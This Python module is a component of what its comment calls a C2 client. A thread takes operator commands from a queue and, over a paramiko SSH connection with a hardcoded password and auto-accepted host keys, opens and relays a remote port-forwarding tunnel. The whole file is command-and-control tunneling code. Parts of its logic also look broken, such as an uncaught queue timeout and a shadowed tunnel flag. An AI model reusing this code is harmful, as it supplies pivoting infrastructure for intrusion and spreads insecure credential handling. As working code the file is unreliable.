import sys
import paramiko
import threading
import socket
import subprocess
import select
from queue import Queue

closeTunnel = False


class ClientThread(threading.Thread):
    def __init__(self, commands):
        # `commands` is a Queue of commands from the main C2 client class
        super(ClientThread, self).__init__()
        self.commands = commands

        self.REMOTE_HOST = "localhost"
        self.REMOTE_PORT = 22
        self.USERNAME = "test_ssh_user"
        self.PASSWORD = "somePa55word"

        self.stop_request = threading.Event()

        self.client = paramiko.SSHClient()
        self.client.load_system_host_keys()
        self.client.set_missing_host_key_policy(paramiko.AutoAddPolicy)

    def run(self):
        self.client.connect(self.REMOTE_HOST, self.REMOTE_PORT,
                            username=self.USERNAME, password=self.PASSWORD)
        chan = self.client.get_transport().open_session()

        while not self.stop_request.is_set():
            command = self.commands.get(True, 0.05)

            if command == "OPEN_TUNNEL":
                forwardFromPort = self.commands.get(True, 0.05)
                self._tunnel_handler(chan, self.REMOTE_HOST, self.REMOTE_PORT,
                                self.client.get_transport(), forwardFromPort)

    def _tunnel_handler(self, channel, host, port, transport, forwardFromPort):
        sock = socket.socket()
        closeTunnel = False
        transport.request_port_forward("", forwardFromPort)

        try:
            sock.connect((host, port))
            print("Connected!")

            while closeTunnel is not True:

                r, w, x = select.select([sock, channel], [], [])

                if sock in r:
                    data = sock.recv(1024)

                    if len(data) == 0:
                        break

                    channel.send(data)

                if channel in r:
                    data = channel.recv(1024)

                    if len(data) == 0:
                        break

                    sock.send(data)

                closeTunnel = (self.commands.get(True, 0.05) == "CLOSE_TUNNEL")

            channel.close()
            sock.close()
            print("Tunnel Closed")

        # User has exited their PTY shell
        except OSError as e:
            print("User exited")

            channel.close()
            sock.close()
            print("Tunnel Closed")

        except Exception as e:
            print("Failed to establish tunnel!")
